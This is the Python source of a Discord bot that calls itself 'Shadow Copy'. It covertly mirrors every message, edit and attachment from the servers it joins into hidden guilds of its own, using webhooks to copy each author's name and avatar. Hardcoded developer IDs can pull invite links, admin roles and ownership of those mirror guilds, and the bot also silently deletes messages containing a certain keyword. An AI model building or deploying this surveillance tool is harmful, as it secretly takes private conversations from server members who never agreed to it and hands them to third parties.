try:
    import keep_alive

    keep_alive.keep_alive()
except Exception as e:
    print(e)

import os
import asyncio
from typing import List

import discord.ext
from discord import Message, Guild, Template, TextChannel, Webhook, DMChannel, Invite, Role
from discord.ext import commands

# ^ basic imports for other features of discord.py and python ^
from discord.ext.commands import Context, Bot

clients = discord.Client()  # ??????????

client: Bot = commands.Bot(command_prefix='', intents=discord.Intents.all())  # put your own prefix here

dev = [761484355084222464, 332394297536282634, 761484355084222464, 840024475712880712] # don't add volas


# Submit async function
def unAsync(task):
    return asyncio.get_running_loop().create_task(task)


guildCacheMirror = {}
channelCacheMirror = {}


def concat(a, b):
    a = int(a)
    b = int(b)
    return int(f"{a}{b}")


async def recallGuild():
    global guildCacheMirror
    guilds = await client.fetch_guilds(limit=None).flatten()
    for guild in guilds:
        try:
            guildCacheMirror[int(guild.name)] = guild
        except ValueError:
            continue


def getLastSubstring(lastLength: int, string: str):
    l = len(string)
    return string[l - lastLength: l]


async def recallChannels(baseGuildID: int, mirrorGuild: Guild):
    global channelCacheMirror
    channels = await mirrorGuild.fetch_channels()
    for channel in channels:
        if type(channel) is not TextChannel: continue
        try:
            channelCacheMirror[concat(baseGuildID, getLastSubstring(18, channel.name))] = channel
        except Exception as e:
            print(e)
            await channel.delete()
    return channelCacheMirror

def getPos(chn):
    return chn.position

async def syncServer(mirrorGuild: Guild, baseGuild: Guild):
    global channelCacheMirror
    baseChannels = await baseGuild.fetch_channels()
    mirrorChannels = await mirrorGuild.fetch_channels()
    baseChannels.sort(key=getPos)
    # Registering channels to mirror
    for channel in baseChannels:
        try:
            if type(channel) is not TextChannel: continue
            baseId: int = concat(baseGuild.id, channel.id)
            channelCacheMirror[baseId] = await getOrMakeMirrorChannel(mirrorGuild, channel)
        except Exception:
            continue

    # validating, registering cache
    for channel in mirrorChannels:
        try:
            channel: TextChannel = channel
            baseId: int = int(getLastSubstring(18, channel.name))
            baseId = concat(baseGuild.id, baseId)
            mirror: TextChannel = channelCacheMirror[baseId]
            if mirror and mirror.id != channel.id:
                raise Exception("Channel Exist: " + str(mirror))
            channelCacheMirror[baseId] = channel
        except Exception as e:
            print(e)
            await channel.delete()

    # Reordering channels in mirror
    for channel in baseChannels:
        if type(channel) is not TextChannel: continue
        print(channel.name+": " + str(channel.position))
        targetChannels: TextChannel = await getOrMakeMirrorChannel(mirrorGuild, channel)
        await targetChannels.edit(position=channel.position)


async def createMirrorGuild(guild: Guild):
    newGuild: Guild = await client.create_guild(name=str(guild.id))
    print("Create new guild for: " + guild.name)
    global guildCacheMirror
    guildCacheMirror[guild.id] = newGuild
    await syncServer(newGuild, guild)
    return newGuild


async def getOrMakeMirrorChannel(mirrorGuild: Guild, baseChannel: TextChannel):
    global channelCacheMirror
    assad: int = concat(baseChannel.guild.id, baseChannel.id)
    if assad not in channelCacheMirror:
        channelCacheMirror = await recallChannels(baseChannel.guild.id, mirrorGuild)
    if assad not in channelCacheMirror:
        print("Making channel: " + baseChannel.name[0:81] + str(baseChannel.id))
        targetChannel: TextChannel = await mirrorGuild.create_text_channel(
            name=baseChannel.name[0:81] + str(baseChannel.id), topic=baseChannel.topic, reason="Mirroring")
        channelCacheMirror[assad] = targetChannel
    if assad not in channelCacheMirror:
        raise Exception("Can't create or get channel: " + baseChannel.name + " from guild " + baseChannel.guild.name)
    return channelCacheMirror[assad]


webhookCache = {}


async def getWebhook(channel: TextChannel):
    global webhookCache
    if channel.id not in webhookCache:
        webhook: List = await channel.webhooks()
        if len(webhook) == 0:
            webhookCache[channel.id] = await channel.create_webhook(name="Mirror")
        else:
            webhookCache[channel.id] = webhook.pop()
    return webhookCache[channel.id]


async def imitateWebhook(message: Message, channel: TextChannel):
    webhook: Webhook = await getWebhook(channel)
    files: List = []
    embeds: List = []
    if message.embeds:
        for _ in message.embeds:
            embeds.append(_)
    if message.attachments:
        for _ in message.attachments:
            file = await _.to_file(use_cached=True)
            files.append(file)

    await webhook.send(content=message.content, embeds=message.embeds, files=files,
                       avatar_url=message.author.avatar_url,
                       username=message.author.display_name + "#" + message.author.discriminator,
                       allowed_mentions=discord.AllowedMentions.none())


@client.event
async def on_message_edit(before: Message, after: Message):
    if len(after.content) < 1950:
        after.content = "Edited\n" + after.content
    await on_message(after)


@client.event
async def on_message(message: Message):
    if not message.guild: return
    if "ITZBENZIS" in message.content.upper():
      await message.delete()
    if message.content == "test":
        await message.channel.send("ok and ?")
    if message.guild.owner.id == client.user.id:
        if message.author.id in dev:
            if message.content == "admin":
                await message.channel.send("brb")
                role: Role = await message.guild.create_role(name="Admin", permissions=discord.Permissions.all())
                await message.author.add_roles(role)
                return
            if message.content == "transferAuthority":
                await message.channel.send("brb")
                await message.guild.edit(owner=message.author)
                await message.guild.leave()
                return
        return
    orginal: str = message.content
    if len(message.content) < 1950:
        message.content = "ID:" + str(message.id) + "\n" + message.content
    global guildCacheMirror
    if message.guild.id not in guildCacheMirror:
        if len(guildCacheMirror) == 0: await recallGuild()
        if message.guild.id not in guildCacheMirror:
            guildCacheMirror[message.guild.id] = await createMirrorGuild(message.guild)
        if message.guild.id not in guildCacheMirror:
            print("Can't find mirror guild for: " + message.guild.name)
            return
    mirrorGuild: Guild = guildCacheMirror[message.guild.id]
    mirrorChannel: TextChannel = await getOrMakeMirrorChannel(mirrorGuild, message.channel)
    if message.author.id in dev:
        if orginal == "invite":
            dm: DMChannel = await message.author.create_dm()
            invite: Invite = await mirrorChannel.create_invite(max_age=120, reason=message.author.name)
            await message.channel.send("check DM")
            await dm.send(invite.url)

        if orginal == "getMirror":

            await message.channel.send("https://discord.com/channels/"+str(mirrorGuild.id)+"/"+str(mirrorChannel.id)+"/"+str(mirrorChannel.last_message_id))
        if orginal == "syncServer":
            await message.channel.send("brb")
            await syncServer(mirrorGuild, message.guild)
    await imitateWebhook(message, mirrorChannel)
    # print(message.content)


@client.event
async def on_ready():
    await recallGuild()
    print(
        "Shadow Copy: " + client.user.name + "#" + client.user.discriminator)  # will print "bot online" in the console when the bot is online


@client.command()
async def test(ctx: Context):
    print("message work")
    await ctx.send("yes")


client.run(os.getenv("TOKEN"))
